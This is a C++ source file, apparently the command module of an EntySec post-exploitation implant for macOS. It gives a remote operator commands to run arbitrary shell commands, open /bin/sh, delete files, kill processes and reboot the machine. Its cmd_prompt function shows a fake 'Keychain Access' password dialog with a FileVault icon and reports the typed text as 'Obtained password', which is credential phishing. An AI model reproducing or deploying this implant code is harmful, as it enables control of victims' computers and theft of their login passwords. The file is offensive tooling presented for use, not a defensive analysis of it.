/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "commands.hpp"
#include "utils.hpp"

void cmd_rm(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        if (std::remove(commands[1].c_str()) < 0)
            console_log_error("No such file!");
    } else
        console_log("Usage: rm <file>");
}

void cmd_rmdir(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        if (rmdir(commands[1].c_str()) < 0)
            console_log_error("No such directory!");
    } else
        console_log("Usage: rmdir <directory>");
}

void cmd_mkdir(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        if (mkdir(commands[1].c_str(), 777) < 0)
            console_log_error("Directory already exists!");
    } else
        console_log("Usage: mkdir <directory>");
}

void cmd_exec(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        console_log(exec(commands[1]), 0);
    else
        console_log("Usage: exec <commands>");
}

void cmd_cd(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        chdir(commands[1].c_str());
    else
        console_log("Usage: cd <directory>");
}

void cmd_touch(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        std::fstream file;
        file.open(commands[1].c_str(), std::ios::out);
        file.close();
    } else
        console_log("Usage: touch <file>");
}

void cmd_chmod(std::vector<std::string> commands)
{
    if (commands.size() > 2)
        chmod(commands[2].c_str(), std::stoi(commands[1]));
    else
        console_log("Usage: chmod <mode> <path>");
}

void cmd_chroot(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        chroot(commands[1].c_str());
    else
        console_log("Usage: chroot <path>");
}

void cmd_ls(std::vector<std::string> commands)
{
    struct dirent *entry;

    if (commands.size() > 1) {
        DIR *dir = opendir(commands[1].c_str());
        if (dir == NULL) {
            console_log_error("No such directory.");
        }

        while ((entry = readdir(dir)) != NULL)
            console_log(std::string(entry->d_name));

        closedir(dir);
        return;
    }

    char directory[1024];
    getcwd(directory, sizeof(directory));
    DIR *dir = opendir(directory);

    if (dir == NULL) {
        console_log_error("No such directory.");
    }

    while ((entry = readdir(dir)) != NULL)
        console_log(std::string(entry->d_name));

    closedir(dir);
}

void cmd_kill(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        kill(std::stoi(commands[1]), SIGTERM);
    else
        console_log("Usage: kill <process_id>");
}

void cmd_cat(std::vector<std::string> commands)
{
    if (commands.size() > 1) {
        std::ifstream input(commands[1]);
        for (std::string line; getline(input, line); )
            console_log(line);
    } else
        console_log("Usage: cat <file>");
}

void cmd_shell()
{
    system("/bin/sh");
}

void cmd_pwd()
{
    char directory[1024];
    getcwd(directory, sizeof(directory));
    console_log(std::string(directory));
}

void cmd_whoami()
{
    std::string username = std::string(getlogin());
    console_log(username);
}

void cmd_hostname()
{
    char hostname[1024];
    gethostname(hostname, sizeof(hostname));
    console_log(std::string(hostname));
}

void cmd_getuid()
{
    std::string uid = std::to_string(getuid());
    console_log_information("Current user id: ", 0);
    console_log(uid);
}

void cmd_getpid()
{
    std::string pid = std::to_string(getpid());
    console_log_information("Membrane attached PID: ", 0);
    console_log(pid);
}

void cmd_getgid()
{
    std::string gid = std::to_string(getgid());
    console_log_information("Current group id: ", 0);
    console_log(gid);
}

void cmd_ps()
{
    console_log(exec("ps aux"));
}

void cmd_reboot()
{
    sync();
    reboot(RB_AUTOBOOT);
}

void cmd_help()
{
    int counter = 0;

    for (const auto& [key, _] : passCmds) {
        if (counter % 5 == 0) {
            console_log("");
            console_log("  ", 0);
        }
        console_log(key + ", ", 0);
        counter++;
    }

    for (const auto& [key, _] : nopassCmds) {
        if (counter % 5 == 0) {
            console_log("");
            console_log("  ", 0);
        }
        console_log(key + ", ", 0);
        counter++;
    }

    if (counter % 5 != 0)
        console_log(" exit");
    else {
        console_log("");
        console_log("  exit");
    }
    console_log("");
}

void cmd_osascript(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        exec("osascript -e '" + commands[1] + "'");
    else
        console_log("Usage: osascript <script>");
}

void cmd_setvol(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        exec("osascript -e 'set volume output volume " + commands[1] + "'");
    else
        console_log("Usage: setvol <percentage>");
}

void cmd_say(std::vector<std::string> commands)
{
    if (commands.size() > 1)
        exec("say " + commands[1]);
    else
        console_log("Usage: say <message>");
}

void cmd_getvol()
{
    std::string output = exec("osascript -e 'output volume of (get volume settings)'");
    console_log_information("Current volume level: " + output, 0);
}

void cmd_prompt()
{
    std::string payload = "set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer";
    std::string output = exec("osascript -e '" + payload + "'");
    
    erase(output, "button returned:OK, text returned:");
    console_log_information("Obtained password: " + output, 0);
}
